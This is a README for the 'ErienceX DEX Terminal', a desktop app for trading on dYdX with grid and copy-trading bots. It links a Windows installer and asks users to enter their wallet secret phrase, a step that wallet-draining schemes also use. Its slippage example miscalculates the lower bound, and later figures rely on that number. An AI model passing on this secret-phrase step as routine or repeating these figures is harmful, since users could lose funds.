# ErienceX DEX Terminal 1.0.7

## Terminal Screenshot
![Terminal Screenshot](https://raw.githubusercontent.com/erience/eriencex-dex-terminal/refs/heads/main/assets/terminal-screen-107.png)

## Terminal Steps
1. 📥 **Download and install the terminal** from the following link: [Download ErienceX DEX Terminal v1.0.7](https://github.com/erience/eriencex-dex-terminal/releases/download/v1.0.7/ErienceX-DEX-Terminal-1.0.7-setup.exe)
2. 🔑 **Enter your Secret Phrase** as shown in the image below. ![Secret Phrase](https://raw.githubusercontent.com/erience/eriencex-dex-terminal/refs/heads/main/assets/secret-phrase.png)
3. 📊 **Place Limit/Market Buy and Sell Orders** using the right-side order box.

## Dydx Grid Trading Bot

### ⚡ From and To Price
🔹 **What to do:** Set the price range in which you want the Grid Bot to operate.
🔹 **Example:** For Bitcoin, if you set the start price to **$60,000** and the stop price to **$90,000**, the bot will only make trades while Bitcoin’s price is between **$60K and $90K**.

### 💰 Investment Amount
🔹 **What to do:** Decide how much money you want the bot to use for trading.
🔹 **Example:** If you enter **$10,000**, the bot will use that entire amount of your **USDC balance** for trades. If you don’t have $10,000 in your account, the bot will **use leverage** (borrowed funds) to reach the amount needed.

### 📈 Number of Grids
🔹 **What to do:** Set how many trading levels (or grids) you want the bot to work with.
🔹 **Example:** If you set **100 grids**, the bot will divide your **$10,000 investment** into 100 smaller amounts, so each grid gets around **$100** to trade with.

### 📉 Slippage
🔹 **What to do:** Set how much the price can move before the bot buys or sells.
🔹 **Example:** If your bot is set to enter a trade at **$60,200** and you set a **0.05% slippage**, the bot will allow for a small price range from **$60,169.10 to $60,230.10**. The bot will buy when the price hits anywhere in this range.

### 🎯 Take Profit Percentage
🔹 **What to do:** Decide how much profit you want to make before the bot closes a trade.
🔹 **Example:** If your entry price was **$60,169.10** and you set a **0.20% take profit**, the bot will sell the grid when the price reaches **$60,289.44**.

## 📌 Copy Trading Bot

### 🔗 Enter URL
🔹 **What to do:** Paste the URL of the wallet or trading account you want to copy trades from.
🔹 **Example:** If the source URL is **[dydxboard.com](https://dydxboard.com/ZHlkeDE0ZGx0YzJ3NnkzZGhmMG5hejhsdWdsc3ZqdDB2aHZzd20yajZkMA==)**, copy and paste it here.

### 📊 Select Market Sides
🔹 **What to do:** Decide which types of trades you want to copy:
   - **📈 Long:** Only copy long positions (buying with the expectation of price increase).
   - **📉 Short:** Only copy short positions (selling with the expectation of price decrease).
   - **🔄 Both:** Copy both long and short trades.

### 🏛 Select Markets
🔹 **What to do:** Choose which markets to copy trades for:
   - **📍 All Markets:** Copy trades from all available markets.
   - **🔎 Specific Markets:** Select individual markets (e.g., **BTC, ETH, SOL**).

### 📏 Set Trade Percentage
🔹 **What to do:** Define the percentage of the original trade value you want to replicate.
🔹 **Example 1:** If the original trade is **$100** and you enter **100%**, your trade will also be **$100**.
🔹 **Example 2:** If the original trade is **$100** and you enter **10%**, your trade will be **$10**.

### ⚠️ Disclaimer
🔹 If the original order size is greater than the trade amount you selected, the bot will automatically place the order using the nearest possible trade size.
🔹 **Example:** If the original order is for **$150** and you selected a trade percentage that results in **$12**, but the minimum order size allowed by the market is **$20**, the bot will place an order for **$20** instead.

## Terminal Preview
![Terminal Preview](https://raw.githubusercontent.com/erience/eriencex-dex-terminal/aa1b51127a38a7144b8fe8231fe632d640362edd/terminal.gif)
